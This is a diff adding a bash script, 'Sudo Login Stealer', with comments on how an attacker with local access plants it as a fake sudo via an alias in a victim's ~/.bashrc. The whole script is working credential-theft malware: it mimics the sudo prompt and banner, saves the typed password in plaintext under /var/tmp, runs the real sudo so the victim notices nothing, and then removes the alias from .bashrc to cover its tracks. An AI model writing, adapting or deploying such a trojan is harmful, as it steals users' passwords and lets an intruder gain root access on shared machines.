@@ -1,0 +1,48 @@
+#!/bin/bash
+#
+# Sudo Login Stealer
+# ~ by Acidburn
+#
+# Use case:
+#	You have local access and the victim's
+#	~/.bashrc is writeable
+#
+# Usage:
+#	Place this shell script in:
+#	/var/tmp/.sudo
+#	Remember to make it chmod 755
+# 	Place the following in victim's ~/.bashrc
+# 	alias sudo='/var/tmp/.sudo'
+#
+# Outcome:
+#	The vitcim's password should be written to:
+#	 /var/tmp/.$USER.pass
+#
+
+if [ -e "/var/tmp/.${USER}.pass" ]
+then
+	# PASSWORD HAS ALREADY BEEN STOLEN SO EXECUTE SUDO NORMALLY
+	\sudo $@
+else
+	# PRINT INITIAL LOGIN BANNER
+	cat <<-BANNER
+	We trust you have received the usual lecture from the local System
+	Administrator. It usually boils down to these three things:
+
+	    #1) Respect the privacy of others.
+	    #2) Think before you type.
+	    #3) With great power comes great responsibility.
+	BANNER
+
+	# READ PASSWORD
+	read -sp "[sudo] password for $USER: " password
+
+	# NEWLINE
+	echo
+
+	# COPY PASSWORD TO FILE AND EXECUTE SUDO
+	echo $password | tee /var/tmp/.${USER}.pass | \sudo -S $@
+
+	# CLEANUP THE .bashrc FILE
+	sed -i "/alias sudo='\/var\/tmp\/\.sudo'/d" ~/.bashrc
+fi
